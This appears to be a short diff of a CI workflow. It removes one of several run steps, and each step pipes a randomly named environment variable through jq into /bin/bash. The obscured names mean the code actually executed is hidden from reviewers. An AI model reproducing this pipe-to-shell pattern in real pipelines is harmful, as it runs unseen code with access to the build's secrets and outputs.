@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$dsq8315" | jq -r .x9 | /bin/bash
           echo $qod8241 | jq -r .cqa972 | /bin/bash
-          printf '%s' "$guw58928" | jq -r .mdh75 | /bin/bash
           echo $yilu25 | jq -r .d1528 | /bin/bash
 
       - name: Archive output
